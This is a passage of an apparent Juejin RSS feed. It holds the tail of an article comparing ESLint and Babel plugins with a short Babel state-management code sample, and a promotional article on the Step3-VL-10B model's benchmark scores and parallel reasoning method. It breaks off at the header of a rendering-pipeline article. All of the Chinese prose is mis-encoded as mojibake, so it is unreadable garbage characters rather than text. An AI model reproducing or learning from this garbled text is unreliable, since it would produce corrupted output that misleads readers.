<li>çŠ¶æ€é€šè¿‡ <code>state</code> å‚æ•°åœ¨ Visitor æ–¹æ³•é—´ä¼ é€’ã€‚</li>
<li><code>state.file</code> åŒ…å«å½“å‰æ–‡ä»¶çš„å…ƒæ•°æ®ã€‚</li>
<li><code>state.opts</code> åŒ…å«ç”¨æˆ·åœ¨ <code>.babelrc</code> ä¼ å…¥çš„æ’ä»¶é…ç½®ã€‚</li>
<li>å¯ä»¥åœ¨ <code>pre()</code> å’Œ <code>post()</code> é’©å­ä¸­åˆå§‹åŒ–å’Œæ¸…ç†çŠ¶æ€ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Babel çŠ¶æ€ç®¡ç†ç¤ºä¾‹</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-title function_">pre</span>(<span class="hljs-params">state</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// åˆå§‹åŒ–æ–‡ä»¶çº§ç¼“å­˜</span>
  },
  <span class="hljs-attr">visitor</span>: {
    <span class="hljs-title class_">Identifier</span>(path, state) {
      <span class="hljs-comment">// this.cache åœ¨è¿™é‡Œå¯ç”¨</span>
    }
  },
  <span class="hljs-title function_">post</span>(<span class="hljs-params">state</span>) {
    <span class="hljs-comment">// æ¸…ç†</span>
  }
};
</code></pre>
<h4 data-id="heading-14">3. èŠ‚ç‚¹æ„é€ ä¸æ›¿æ¢</h4>
<ul>
<li>
<p><strong>ESLint Fixer</strong>:</p>
<ul>
<li>åŸºäº<strong>æ–‡æœ¬ç´¢å¼•</strong>ï¼ˆIndexï¼‰ã€‚</li>
<li>API: <code>replaceText(node, 'newText')</code>, <code>insertTextAfter(node, ';')</code>.</li>
<li>éå¸¸è„†å¼±ã€‚å¦‚æœä½ åˆ é™¤äº†ä¸€ä¸ªé€—å·ï¼Œå¯èƒ½å¯¼è‡´åç»­çš„ä»£ç è¯­æ³•é”™è¯¯ã€‚ESLint ä¼šå°è¯•å¤šæ¬¡è¿è¡Œ fix ç›´åˆ°ä¸å†æœ‰å˜åŠ¨ï¼Œä½†å®ƒä¸ä¿è¯ç”Ÿæˆçš„ä»£ç  AST ç»“æ„æ­£ç¡®ï¼Œåªä¿è¯æ–‡æœ¬æ›¿æ¢ã€‚</li>
</ul>
</li>
<li>
<p><strong>Babel Types</strong>:</p>
<ul>
<li>åŸºäº<strong>å¯¹è±¡æ„å»º</strong>ã€‚</li>
<li>API: <code>t.binaryExpression('+', t.numericLiteral(1), t.numericLiteral(2))</code>ã€‚</li>
<li>éå¸¸å¥å£®ã€‚åªè¦ç¬¦åˆ AST è§„èŒƒï¼ŒBabel Generator å°±èƒ½ç”Ÿæˆåˆæ³•çš„ JavaScript ä»£ç ï¼ˆè‡ªåŠ¨å¤„ç†æ‹¬å·ä¼˜å…ˆçº§ã€åˆ†å·ç­‰ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-15">æ€»ç»“</h3>
<ul>
<li>å¦‚æœä½ çš„éœ€æ±‚æ˜¯ <strong>â€œé˜»æ­¢å¼€å‘è€…æäº¤çƒ‚ä»£ç â€</strong> æˆ–è€… <strong>â€œç»Ÿä¸€å›¢é˜Ÿçš„ä»£ç é£æ ¼â€</strong>ï¼Œè¯·é€‰æ‹© <strong>ESLint æ’ä»¶</strong>ã€‚å®ƒçš„æ ¸å¿ƒæ˜¯ Context å’Œ Reportã€‚</li>
<li>å¦‚æœä½ çš„éœ€æ±‚æ˜¯ <strong>â€œå‡å°‘é‡å¤çš„æ ·æ¿ä»£ç â€</strong>ï¼Œ<strong>â€œå…¼å®¹ä½ç‰ˆæœ¬æµè§ˆå™¨â€</strong> æˆ–è€… <strong>â€œå®ç°ä¸€ç§æ–°çš„è¯­æ³•ç³–â€</strong>ï¼Œè¯·é€‰æ‹© <strong>Babel æ’ä»¶</strong>ã€‚å®ƒçš„æ ¸å¿ƒæ˜¯ Pathã€Visitor å’Œ Types Builderã€‚</li>
</ul>
<p>ä»¥ä¸Šä»£ç å±•ç¤ºäº†ä»é›¶æ„å»ºä¸€ä¸ªæ¶æ„çº§ ESLint è§„åˆ™å’Œä¸€ä¸ªç¼–è¯‘çº§ Babel è½¬æ¢æ’ä»¶çš„å®Œæ•´è¿‡ç¨‹ï¼Œæ¶µç›–äº† AST åˆ†æã€ä¸Šä¸‹æ–‡åˆ¤æ–­ã€èŠ‚ç‚¹æ„å»ºå’Œå•å…ƒæµ‹è¯•ç­‰æ ¸å¿ƒç¯èŠ‚ã€‚åœ¨å®é™…å·¥ç¨‹ä¸­ï¼Œè¿™ä¸¤è€…å¾€å¾€ç»“åˆä½¿ç”¨ï¼šBabel è´Ÿè´£æŠŠä»£ç å˜æ ·ï¼ŒESLint è´Ÿè´£ä¿è¯å˜æ ·å‰çš„æºç ç¬¦åˆè§„èŒƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è°è¯´å‚æ•°å³æ­£ä¹‰ï¼Ÿ10Bå°é’¢ç‚®Step3-VLç¡¬åˆšåƒäº¿å·¨å¤´]]></title>    <link>https://juejin.cn/post/7597679732364361770</link>    <guid>https://juejin.cn/post/7597679732364361770</guid>    <pubDate>2026-01-21T12:34:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597679732364361770" data-draft-id="7597679732364345386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è°è¯´å‚æ•°å³æ­£ä¹‰ï¼Ÿ10Bå°é’¢ç‚®Step3-VLç¡¬åˆšåƒäº¿å·¨å¤´"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-21T12:34:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è°è¯´å‚æ•°å³æ­£ä¹‰ï¼Ÿ10Bå°é’¢ç‚®Step3-VLç¡¬åˆšåƒäº¿å·¨å¤´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:34:05.000Z" title="Wed Jan 21 2026 12:34:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´é‡Œï¼ŒAIåœˆæµè¡Œç€ä¸€ç§è¿‘ä¹è¿·ä¿¡çš„è®¤çŸ¥ï¼šå¤§åŠ›å‡ºå¥‡è¿¹ã€‚æƒ³è¦æ›´å¼ºçš„æ¨ç†èƒ½åŠ›ï¼ŸåŠ å‚æ•°ã€‚æƒ³è¦çœ‹æ‡‚æ›´å¤æ‚çš„å›¾è¡¨ï¼ŸåŠ å‚æ•°ã€‚ä»¿ä½›åªè¦æŠŠæ˜¾å¡å †æ»¡ï¼Œæ¨¡å‹å°±èƒ½äº§ç”Ÿç¥è¿¹ã€‚</p>
<p>ä½†å°±åœ¨2026å¹´å¼€å¹´ï¼Œé˜¶è·ƒæ˜Ÿè¾°ï¼ˆStepFunï¼‰ç”©å‡ºçš„è¿™å¼ ç‹ç‚¸â€”â€”<strong>Step3-VL-10B</strong>ï¼Œç‹ ç‹ åœ°ç»™äº†â€œå‚æ•°è‡³ä¸Šè®ºâ€ä¸€è®°è€³å…‰ã€‚</p>
<p>è¿™å°±å¥½æ¯”åœ¨ä¸€åœºé‡é‡çº§æ‹³å‡»èµ›é‡Œï¼Œä¸€ä¸ªè½»é‡çº§é€‰æ‰‹ä¸ä»…æŠ—ä½äº†é‡é‡çº§æ‹³ç‹çš„è¿›æ”»ï¼Œè¿˜åæ‰‹æŠŠå¯¹æ–¹KOäº†ã€‚è¿™æ¬¾ä»…æœ‰100äº¿å‚æ•°çš„æ¨¡å‹ï¼Œåœ¨å¤šé¡¹æ ¸å¿ƒæŒ‡æ ‡ä¸Šï¼Œç¡¬ç”Ÿç”ŸæŒ‰ä½äº†å‚æ•°é‡æ˜¯å®ƒ10å€ç”šè‡³20å€çš„å¯¹æ‰‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasdfgfdsgdf-1024x641.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asdfgfdsgdf-1024x641.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb14bcb18924c659bccb796f0f0d828~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=Jc2AKdWGYDrWLBM%2BHLP%2B4ibpQus%3D" alt="asdfgfdsgdf" loading="lazy"/></a></p>
<p><strong>å°èº«æ¿é‡Œçš„æ€ªå…½çº§æ€§èƒ½</strong></p>
<p>å’±ä»¬å…ˆä¸è°ˆè™šçš„ï¼Œç›´æ¥çœ‹æ•°æ®ã€‚</p>
<p>é€šå¸¸æ¥è¯´ï¼Œ10Bçº§åˆ«çš„æ¨¡å‹åªèƒ½ç®—æ˜¯â€œç”œç‚¹çº§â€ï¼Œç”¨æ¥åšåšç®€å•çš„å¯¹è¯æˆ–è€…è·‘åœ¨ç¬”è®°æœ¬ä¸Šç©ç©ã€‚ä½†Step3-VL-10Bæ‹¿å‡ºçš„æˆç»©å•ç®€ç›´ä¸è®²æ­¦å¾·ã€‚</p>
<p>åœ¨æ•°å­¦ç«èµ›åŸºå‡†AIME 2025ä¸Šï¼Œå®ƒæ‹¿ä¸‹äº†94.43%çš„é«˜åˆ†ã€‚ä½œä¸ºå¯¹æ¯”ï¼ŒQwen3-VLï¼ˆ235Bå‚æ•°ï¼‰å’ŒGemini 2.5 Proè¿™ç§å·¨æ— éœ¸éƒ½åœ¨å®ƒèº«ååƒç°ã€‚åœ¨è€ƒå¯ŸSTEMç»¼åˆèƒ½åŠ›çš„MMMUè¯„æµ‹ä¸­ï¼Œå®ƒä¹Ÿä»¥80.11%çš„æˆç»©è¶…è¶Šäº†GLM-4.6Vï¼ˆ106Bï¼‰ã€‚</p>
<p>è¿™ä¸ä»…æ˜¯â€œè¶Šçº§æŒ‘æˆ˜â€ï¼Œè¿™ç®€ç›´æ˜¯é™ç»´æ‰“å‡»ã€‚å¦‚æœä¸æ˜¯ç™½çº¸é»‘å­—çš„æŠ€æœ¯æŠ¥å‘Šæ‘†åœ¨é‚£é‡Œï¼Œå¾ˆéš¾ç›¸ä¿¡ä¸€ä¸ª10Bæ¨¡å‹èƒ½åœ¨æ•°å­¦è§†è§‰æ¨ç†ï¼ˆMathVisionï¼‰å’ŒGUIäº¤äº’èƒ½åŠ›ä¸ŠæŠŠåƒäº¿æ¨¡å‹é€¼åˆ°å¢™è§’ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdasfds-1024x576.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdasfds-1024x576.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb061cbb17794a42a620feffb161a2d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=1bSJIsywkwlbtf7hg9ipOS9xhwc%3D" alt="asfdasfds" loading="lazy"/></a></p>
<p><strong>æ ¸å¿ƒé»‘ç§‘æŠ€ï¼šå®ƒå­¦ä¼šäº†â€œæ·±æ€ç†Ÿè™‘â€</strong></p>
<p>è¿™æ¨¡å‹æ˜¯åƒäº†ä»€ä¹ˆä»™ä¸¹ï¼Ÿç­”æ¡ˆæ˜¯ä¸€ä¸ªå«åš <strong>PaCoReï¼ˆå¹¶è¡Œåè°ƒæ¨ç†ï¼‰</strong> çš„æœºåˆ¶ã€‚</p>
<p>ä¼ ç»Ÿçš„æ¨¡å‹æ¨ç†å¤§å¤šæ˜¯â€œç›´è‚ å­â€ï¼Œç»™ä½ ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒåŸºäºå½“å‰çš„ä¸Šä¸‹æ–‡é¡ºç€å¾€ä¸‹ç¼–ï¼Œä¸€æ¡é“èµ°åˆ°é»‘ã€‚è¿™ç§çº¿æ€§æ€ç»´åœ¨å¤„ç†å¤æ‚é€»è¾‘æ—¶å¾ˆå®¹æ˜“ç¿»è½¦ï¼Œå—é™äºä¸Šä¸‹æ–‡çª—å£ï¼Œæ·±åº¦ä¹Ÿæœ‰é™ã€‚</p>
<p>Step3-VL-10Båˆ™ä¸åŒã€‚PaCoReæœºåˆ¶è®©å®ƒæ‹¥æœ‰äº†ç±»ä¼¼äººç±»â€œç³»ç»Ÿ2â€çš„æ€è€ƒèƒ½åŠ›ã€‚å½“é¢å¯¹ä¸€ä¸ªéš¾é¢˜æ—¶ï¼Œå®ƒä¸å†æ€¥ç€ç»™ç­”æ¡ˆï¼Œè€Œæ˜¯ç¬é—´åœ¨åå°å¹¶è¡Œç”Ÿæˆåå‡ æ¡ç”šè‡³æ›´å¤šçš„æ¨ç†è½¨è¿¹ã€‚è¿™å°±å¥½æ¯”ä¸€ä¸ªå›¢é˜Ÿåœ¨å¤´è„‘é£æš´ï¼Œå¤§å®¶åˆ†å¤´å»è¯•é”™ã€å»éªŒè¯ï¼Œæœ€åæŠŠæ‰€æœ‰çº¿ç´¢æ±‡æ€»ï¼Œåˆæˆä¸€ä¸ªæœ€é è°±çš„ç»“è®ºã€‚</p>
<p>é€šè¿‡è¿™ç§â€œå¹¶è¡Œæ¢ç´¢-åè°ƒåˆæˆâ€çš„æ–¹å¼ï¼Œå®ƒåœ¨ä¸å¢åŠ ä¸Šä¸‹æ–‡çª—å£çš„å‰æä¸‹ï¼ŒæŠŠæœ‰æ•ˆæ¨ç†è®¡ç®—é‡æ‰©å±•åˆ°äº†ç™¾ä¸‡Tokençº§åˆ«ã€‚è¯´ç™½äº†ï¼Œå®ƒç”¨â€œæ›´èªæ˜çš„æ€è€ƒæ–¹å¼â€å¼¥è¡¥äº†â€œè„‘å®¹é‡ï¼ˆå‚æ•°ï¼‰â€çš„ä¸è¶³ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-21_20.22.05-1024x588.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-21_20.22.05-1024x588.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de89c85c647943c6aedd1938b7b90a91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=GROzGjcifXex8s3%2Fkms5FNb04cc%3D" alt="iShot_2026-01-21_20.22.05" loading="lazy"/></a></p>
<p><strong>ç‚¼ä¸¹ç‚‰é‡Œçš„ç§˜å¯†</strong></p>
<p>é™¤äº†æ¨ç†æ¶æ„çš„é©æ–°ï¼Œåº•å±‚çš„åŠŸå¤«ä¹Ÿæ²¡å°‘ä¸‹ã€‚é˜¶è·ƒæ˜Ÿè¾°è¿™æ¬¡èµ°çš„æ˜¯â€œå…¨å‚æ•°ç«¯åˆ°ç«¯è”åˆé¢„è®­ç»ƒâ€çš„è·¯å­ã€‚</p>
<p>å¾ˆå¤šå¤šæ¨¡æ€æ¨¡å‹ä¸ºäº†çœäº‹ï¼Œè§†è§‰ç¼–ç å™¨æ˜¯å†»ç»“çš„ï¼Œç›¸å½“äºç»™å¤§æ¨¡å‹æˆ´äº†å‰¯è¿‘è§†çœ¼é•œã€‚è€ŒStep3-VL-10Bæ˜¯æŠŠè§†è§‰å’Œè¯­è¨€éƒ¨åˆ†å…¨éƒ¨è§£å†»ï¼Œæ”¾åœ¨1.2ä¸‡äº¿é«˜è´¨é‡Tokené‡Œä¸€èµ·ç‚¼ã€‚å†åŠ ä¸Šè¶…è¿‡1400è½®çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRL Scalingï¼‰ï¼Œè¿™è®©è§†è§‰ä¿¡å·å’Œè¯­è¨€é€»è¾‘åœ¨åº•å±‚å°±å®ç°äº†çœŸæ­£çš„æ‰“é€šã€‚</p>
<p><strong>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Step3-VL-10Bçš„å¼€æºï¼Œå¯¹è¡Œä¸šçš„å½±å“å¯èƒ½æ¯”å‘ä¸€ä¸ªè¶…çº§å¤§æ¨¡å‹è¿˜è¦æ·±è¿œã€‚</p>
<p>é¦–å…ˆæ˜¯<strong>ç«¯ä¾§AIçš„æ˜¥å¤©</strong>ã€‚ä»¥å‰æƒ³è¦è¿™ç§çº§åˆ«çš„å¤šæ¨¡æ€ç†è§£èƒ½åŠ›ï¼Œä½ å¿…é¡»è”ç½‘è°ƒAPIï¼Œå› ä¸ºæ‰‹æœºè·‘ä¸åŠ¨åƒäº¿æ¨¡å‹ã€‚ç°åœ¨ï¼Œ10Bçš„ä½“é‡å®Œå…¨æœ‰æœºä¼šå¡è¿›é«˜æ€§èƒ½ç¬”è®°æœ¬ç”šè‡³æœªæ¥çš„æ——èˆ°æ‰‹æœºé‡Œã€‚ä½ çš„ä¸ªäººç”µè„‘å¯èƒ½å¾ˆå¿«å°±èƒ½è¯»æ‡‚å¤æ‚çš„PDFæ–‡æ¡£ã€å¸®ä½ æ“ä½œGUIç•Œé¢ï¼Œè€Œä¸”å®Œå…¨æœ¬åœ°åŒ–è¿è¡Œã€‚</p>
<p>å…¶æ¬¡ï¼Œå®ƒæ‰“ç ´äº†<strong>æˆæœ¬å£å’</strong>ã€‚å¯¹äºç ”ç©¶è€…å’Œå¼€å‘è€…æ¥è¯´ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç°æˆçš„ã€é«˜æ€§èƒ½çš„ã€å¯å¾®è°ƒçš„åŸºåº§ã€‚ä½ ä¸éœ€è¦æ•°ç™¾ä¸‡ç¾å…ƒçš„ç®—åŠ›é›†ç¾¤ï¼Œåªç”¨å‡ å¼ æ¶ˆè´¹çº§æ˜¾å¡ï¼Œå°±èƒ½åœ¨è¿™ä¸ªå¼ºåŠ›åŸºçº¿ä¸Šè·‘å‡ºå®é™…åº”ç”¨ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fsdfsaddrg-1024x981.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/sdfsaddrg-1024x981.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d63b86cdba24a84ae33159093db2fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=%2B3xGOeiG%2F%2BtXXcQSx8Qe%2F3dEx3M%3D" alt="sdfsaddrg" loading="lazy"/></a></p>
<p><strong>æ€»ç»“</strong></p>
<p>é˜¶è·ƒæ˜Ÿè¾°è¿™æ¬¡ä¸ä»…æ˜¯å‘å¸ƒäº†ä¸€ä¸ªæ¨¡å‹ï¼Œæ›´åƒæ˜¯éªŒè¯äº†ä¸€æ¡æ–°è·¯ï¼šä¸å…¶æ— ä¼‘æ­¢åœ°å †ç Œå‚æ•°ï¼Œä¸å¦‚å›å¤´çœ‹çœ‹æ¨ç†æ¶æ„çš„æ•ˆç‡ã€‚</p>
<p>å½“ä¸€ä¸ª10Bæ¨¡å‹å¼€å§‹åœ¨AIMEæ•°å­¦ç«èµ›é‡Œç¢¾å‹å¯¹æ‰‹æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“ï¼ŒAIè¿›åŒ–çš„é£å‘ï¼Œå˜äº†ã€‚å¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œç°åœ¨æœ€å¤§çš„å»ºè®®å°±æ˜¯ï¼šèµ¶ç´§å»Hugging Faceä¸‹è½½æƒé‡ï¼Œåœ¨ä½ çš„æ˜¾å¡ä¸Šè·‘èµ·æ¥è¯•è¯•ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šå®æ—¶æ¸²æŸ“ã€‹ç¬¬2ç« -å›¾å½¢æ¸²æŸ“ç®¡çº¿-2.3å‡ ä½•å¤„ç†]]></title>    <link>https://juejin.cn/post/7597623654056443919</link>    <guid>https://juejin.cn/post/7597623654056443919</guid>    <pubDate>2026-01-21T12:42:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623654056443919" data-draft-id="7597650624637140992" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šå®æ—¶æ¸²æŸ“ã€‹ç¬¬2ç« -å›¾å½¢æ¸²æŸ“ç®¡çº¿-2.3å‡ ä½•å¤„ç†"/> <meta itemprop="keywords" content="è®¡ç®—æœºå›¾å½¢å­¦"/> <meta itemprop="datePublished" content="2026-01-21T12:42:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="charlee44"/> <meta itemprop="url" content="https://juejin.cn/user/1117549770846872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta 